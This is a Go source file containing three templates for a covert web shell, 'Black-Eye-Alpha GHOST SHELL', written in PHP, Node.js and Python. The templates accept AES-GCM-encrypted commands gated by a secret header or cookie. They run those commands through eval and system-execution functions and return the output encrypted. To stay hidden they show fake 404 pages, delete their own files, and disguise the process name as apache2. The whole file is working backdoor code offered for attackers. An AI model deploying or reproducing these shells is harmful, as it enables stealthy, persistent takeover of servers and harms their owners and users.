package template

const (
	TplPHP = `<?php
/**
 * Black-Eye-Alpha v7.6 - GHOST SHELL (KILL SWITCH EDITION)
 */

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

class __ZK_GHOST__ {
    private $k;
    private $sn;
    private $cn;
    private $s;

    public function __construct($salt, $hn, $cn) {
        $this->sn = $hn;
        $this->cn = $cn;
        $this->s = $salt;
    }

    private function cloak() {
        header("HTTP/1.1 404 Not Found");
        echo "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
        exit();
    }

    public function run() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['d'])) {
            $trigger = "";
            if (isset($_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))])) {
                $trigger = $_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))];
            } else if (isset($_COOKIE[$this->cn])) {
                $trigger = $_COOKIE[$this->cn];
            }

            if (!$trigger) return;

            // NO AUTO-KILL: Controlled by operator

            $this->k = hash('sha256', $trigger . hex2bin($this->s), true);
            
            // 2. LFI STABILIZATION
            while (ob_get_level()) ob_end_clean();
            ob_start();

            try {
                $raw = base64_decode($_POST['d']);
                $cmd = $this->decrypt($raw);
                if ($cmd) {
                    $this->execute($cmd);
                } else {
                    $this->cloak();
                }
            } catch (Exception $e) {}
            
            $res = ob_get_clean();
            if (trim($res) === "") { $res = "[*] Command Executed (No Output)"; }
            $this->respond($res);
            exit();
        }
    }

    private function decrypt($data) {
        try {
            $nonce_len = 12;
            if (strlen($data) < $nonce_len + 16) return false;
            $nonce = substr($data, 0, $nonce_len);
            $tag = substr($data, -16);
            $ciphertext = substr($data, $nonce_len, -16);
            return openssl_decrypt($ciphertext, 'aes-256-gcm', $this->k, OPENSSL_RAW_DATA, $nonce, $tag);
        } catch (Exception $e) { return false; }
    }

    private function execute($code) {
        if ($code === '__PURGE__') {
            @unlink(__FILE__);
            $this->respond("GHOST_VANISHED");
            exit();
        }
        try {
            if (strpos($code, '<?php') !== false) {
                eval('?>' . $code);
            } else {
                $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
                foreach ($funcs as $f) {
                    if (function_exists($f)) {
                        $disabled = explode(',', ini_get('disable_functions'));
                        if (!in_array($f, array_map('trim', $disabled))) {
                            if ($f == 'exec') { exec($code, $o); echo implode("\n", $o); }
                            else if ($f == 'shell_exec') { echo shell_exec($code); }
                            else if ($f == 'system') { system($code); }
                            else if ($f == 'passthru') { passthru($code); }
                            else if ($f == 'proc_open') {
                                $handle = proc_open($code, [1=>["pipe","w"], 2=>["pipe","w"]], $pipes);
                                if (is_resource($handle)) {
                                    echo stream_get_contents($pipes[1]);
                                    echo stream_get_contents($pipes[2]);
                                    fclose($pipes[1]); fclose($pipes[2]); proc_close($handle);
                                }
                            }
                            else if ($f == 'popen') {
                                $handle = popen($code, 'r');
                                if ($handle) { echo fread($handle, 8192); pclose($handle); }
                            }
                            return;
                        }
                    }
                }
                echo "[!] No execution functions available.";
            }
        } catch (Exception $e) { echo "[!] Exec Error: " . $e->getMessage(); }
    }

    private function respond($data) {
        try {
            $nonce = openssl_random_pseudo_bytes(12);
            $tag = "";
            $cipher = openssl_encrypt($data, 'aes-256-gcm', $this->k, OPENSSL_RAW_DATA, $nonce, $tag);
            echo base64_encode($nonce . $cipher . $tag);
        } catch (Exception $e) {}
    }
}

$__INIT__ = new __ZK_GHOST__("__SALT_KEY__", "__HEADER_NAME__", "__COOKIE_NAME__");
$__INIT__->run();
?>`

	TplNode = `const http = require('http');
const crypto = require('crypto');
const { exec } = require('child_process');
const fs = require('fs');

process.on('uncaughtException', (err) => { process.exit(0); });
process.on('unhandledRejection', (reason, promise) => { process.exit(0); });

try {
    const filename = __filename;
    fs.unlinkSync(filename);
    process.stdin.unref();
    process.stdout.unref();
    process.stderr.unref();
} catch (e) {}

const SALT = Buffer.from("__SALT_KEY__", 'hex');
const HN = "__HEADER_NAME__".toLowerCase();
const CN = "__COOKIE_NAME__";

const server = http.createServer((req, res) => {
    try {
        let trigger = req.headers[HN] || "";
        if (!trigger && req.headers.cookie) {
            const cookies = req.headers.cookie.split(';');
            for (let c of cookies) {
                if (c.trim().startsWith(CN + '=')) {
                    trigger = c.split('=')[1].trim();
                    break;
                }
            }
        }
        if (!trigger) return cloak(res);
        const key = crypto.createHash('sha256').update(trigger + SALT.toString('hex')).digest();
        if (req.method === 'POST') {
            let body = '';
            req.on('data', chunk => { body += chunk.toString(); });
            req.on('end', () => {
                try {
                    const params = new URLSearchParams(body);
                    const d = params.get('d');
                    if (d) {
                        const raw = Buffer.from(d, 'base64');
                        const cmd = decrypt(raw, key);
                        if (cmd) {
                            exec(cmd.toString(), (err, stdout, stderr) => {
                                respond((stdout || '') + (stderr || ''), key, res);
                            });
                        } else { cloak(res); }
                    } else { cloak(res); }
                } catch (e) { cloak(res); }
            });
        } else { res.end(); }
    } catch (e) { cloak(res); }
});

function cloak(res) {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<html><body><h1>Not Found</h1></body></html>');
}

function decrypt(data, key) {
    try {
        const nonce = data.slice(0, 12);
        const tag = data.slice(-16);
        const ciphertext = data.slice(12, -16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
        decipher.setAuthTag(tag);
        return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    } catch (e) { return null; }
}

function respond(data, key, res) {
    try {
        const nonce = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        const tag = cipher.getAuthTag();
        res.end(Buffer.concat([nonce, encrypted, tag]).toString('base64'));
    } catch (e) { res.end(); }
}

process.title = "/usr/sbin/apache2 -k start";
server.listen(0, '127.0.0.1');`

	TplPython = `import os
import sys
import subprocess
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def daemonize():
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except OSError: sys.exit(1)
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except OSError: sys.exit(1)
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())

daemonize()
try: os.remove(__file__)
except: pass

SALT = bytes.fromhex("__SALT_KEY__")
HN = "__HEADER_NAME__"
CN = "__COOKIE_NAME__"

def handle_request(req_headers, post_data):
    try:
        trigger = req_headers.get(HN) or req_headers.get('Cookie', '').split(CN+'=')[-1].split(';')[0]
        if not trigger: return None
        key = hashlib.sha256((trigger + SALT.hex()).encode()).digest()
        aesgcm = AESGCM(key)
        raw = base64.b64decode(post_data.get('d', ''))
        nonce = raw[:12]
        ciphertext = raw[12:]
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        if plaintext:
            res = subprocess.check_output(plaintext, shell=True, stderr=subprocess.STDOUT)
            out_nonce = os.urandom(12)
            out_cipher = aesgcm.encrypt(out_nonce, res, None)
            return base64.b64encode(out_nonce + out_cipher)
    except: pass
    return None

try:
    import setproctitle
    setproctitle.setproctitle("/usr/sbin/apache2 -k start")
except: pass`
)
